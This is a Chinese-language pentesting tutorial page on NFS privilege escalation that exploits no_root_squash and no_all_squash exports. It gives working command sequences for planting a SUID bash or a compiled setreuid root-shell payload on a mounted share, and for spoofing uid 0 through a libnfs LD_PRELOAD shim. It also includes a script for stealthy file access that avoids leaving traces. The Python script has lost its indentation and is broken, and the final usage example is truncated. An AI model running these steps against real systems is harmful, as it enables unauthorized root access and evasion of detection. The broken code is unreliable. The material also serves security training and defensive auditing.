{{#include ../../banners/hacktricks-training.md}}

阅读 _ **/etc/exports** _ 文件，如果你发现某个目录被配置为 **no_root_squash**，那么你可以 **作为客户端访问** 该目录，并 **像本地的根用户** 一样 **在里面写入**。

**no_root_squash**：这个选项基本上赋予客户端的根用户以根身份访问 NFS 服务器上的文件的权限。这可能导致严重的安全隐患。

**no_all_squash**：这与 **no_root_squash** 选项类似，但适用于 **非根用户**。想象一下，你以 nobody 用户的身份获得一个 shell；检查 /etc/exports 文件；存在 no_all_squash 选项；检查 /etc/passwd 文件；模拟一个非根用户；以该用户创建一个 suid 文件（通过使用 nfs 挂载）。以 nobody 用户身份执行该 suid 文件并成为不同的用户。

# 权限提升

## 远程利用

如果你发现了这个漏洞，你可以利用它：

- **在客户端机器上挂载该目录**，并 **以根身份复制** /bin/bash 二进制文件到挂载文件夹中，并赋予其 **SUID** 权限，然后 **从受害者** 机器执行该 bash 二进制文件。
```bash
#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```
- **在客户端机器上挂载该目录**，并且**以root身份复制**我们编译好的有效载荷到挂载文件夹中，这将滥用SUID权限，赋予其**SUID**权限，并**从受害者**机器执行该二进制文件（您可以在这里找到一些[C SUID有效载荷](payloads-to-execute.md#c)）。
```bash
#Attacker, as root user
gcc payload.c -o payload
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /tmp/payload .
chmod +s payload

#Victim
cd <SHAREDD_FOLDER>
./payload #ROOT shell
```
## 本地利用

> [!NOTE]
> 请注意，如果您可以从您的机器创建一个**到受害者机器的隧道，您仍然可以使用远程版本来利用此权限提升，隧道所需的端口**。\
> 以下技巧适用于文件`/etc/exports`**指示一个IP**的情况。在这种情况下，您**将无法使用**任何情况下的**远程利用**，您需要**利用这个技巧**。\
> 另一个利用成功的必要条件是**`/etc/export`中的导出****必须使用`insecure`标志**。\
> --_我不确定如果`/etc/export`指示一个IP地址，这个技巧是否有效_--

## 基本信息

该场景涉及利用本地机器上挂载的NFS共享，利用NFSv3规范中的一个缺陷，该缺陷允许客户端指定其uid/gid，可能导致未经授权的访问。利用过程涉及使用[libnfs](https://github.com/sahlberg/libnfs)，这是一个允许伪造NFS RPC调用的库。

### 编译库

库的编译步骤可能需要根据内核版本进行调整。在这种特定情况下，fallocate系统调用被注释掉。编译过程涉及以下命令：
```bash
./bootstrap
./configure
make
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
```
### 进行利用

该利用涉及创建一个简单的 C 程序 (`pwn.c`)，该程序提升权限到 root，然后执行一个 shell。程序被编译，生成的二进制文件 (`a.out`) 被放置在具有 suid root 的共享上，使用 `ld_nfs.so` 在 RPC 调用中伪造 uid：

1. **编译利用代码：**

```bash
cat pwn.c
int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
gcc pwn.c -o a.out
```

2. **将利用放置在共享上并通过伪造 uid 修改其权限：**

```bash
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
```

3. **执行利用以获得 root 权限：**
```bash
/mnt/share/a.out
#root
```

## 额外：NFShell 用于隐秘文件访问

一旦获得 root 访问权限，为了在不更改所有权的情况下与 NFS 共享进行交互（以避免留下痕迹），使用一个 Python 脚本 (nfsh.py)。该脚本调整 uid 以匹配被访问文件的 uid，从而允许在共享上与文件进行交互而不出现权限问题：
```python
#!/usr/bin/env python
# script from https://www.errno.fr/nfs_privesc.html
import sys
import os

def get_file_uid(filepath):
try:
uid = os.stat(filepath).st_uid
except OSError as e:
return get_file_uid(os.path.dirname(filepath))
return uid

filepath = sys.argv[-1]
uid = get_file_uid(filepath)
os.setreuid(uid, uid)
os.system(' '.join(sys.argv[1:]))
```
像这样运行：
```bash
# ll ./mount/
drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
```
{{#include ../../banners/hacktricks-training.md}}
